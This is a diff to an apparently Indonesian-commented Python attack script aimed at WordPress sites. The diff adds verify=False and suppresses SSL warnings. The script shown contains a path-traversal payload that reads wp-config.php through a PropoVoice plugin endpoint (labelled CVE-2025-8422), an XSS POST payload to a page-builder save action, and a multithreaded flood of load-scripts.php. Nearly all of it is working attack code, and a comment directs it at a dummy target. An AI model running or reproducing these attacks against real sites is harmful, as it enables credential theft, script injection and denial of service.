@@ -2,13 +2,17 @@ import requests
 import threading
 import time
 
+# Disable warning SSL unverified
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 # Payload baca file arbitrary CVE-2025-8422
 def attack_file_read(url, count):
     vuln_endpoint = "/wp-content/plugins/propovoice/send_email.php"
     payload = "?file=../../../../wp-config.php"
     for i in range(count):
         try:
-            r = requests.get(url + vuln_endpoint + payload, timeout=5)
+            r = requests.get(url + vuln_endpoint + payload, verify=False, timeout=5)
             if "DB_NAME" in r.text:
                 print(f"[FileRead] Request {i+1}: Vulnerable! Config leaked")
             else:
@@ -22,7 +26,7 @@ def attack_xss(url, count):
     xss_payload = {"action":"bold_pagebuilder_save", "content":"<script>alert('XSS')</script>"}
     for i in range(count):
         try:
-            r = requests.post(url + xss_endpoint, data=xss_payload, timeout=5)
+            r = requests.post(url + xss_endpoint, data=xss_payload, verify=False, timeout=5)
             print(f"[XSS] Request {i+1}: Status {r.status_code}")
         except Exception as e:
             print(f"[XSS] Request {i+1} failed: {e}")
@@ -32,7 +36,7 @@ def attack_load_scripts(url, count):
     payload = "?c=1&load=editor,common,user-profile,heartbeat"
     for i in range(count):
         try:
-            r = requests.get(url + "/wp-admin/load-scripts.php" + payload, timeout=5)
+            r = requests.get(url + "/wp-admin/load-scripts.php" + payload, verify=False, timeout=5)
             print(f"[Flood] Request {i+1}: Status {r.status_code}")
         except Exception as e:
             print(f"[Flood] Request {i+1} failed: {e}")
@@ -49,5 +53,5 @@ def do_multithread_attack(url):
         t.join()
 
 if __name__ == "__main__":
-    target_url = "http://alamat-web-dummy-anda.com"  # Ganti URL dummy yang diuji
+    target_url = "https://alamat-web-dummy-anda.com"  # Ganti ke URL dummy Anda
     do_multithread_attack(target_url)
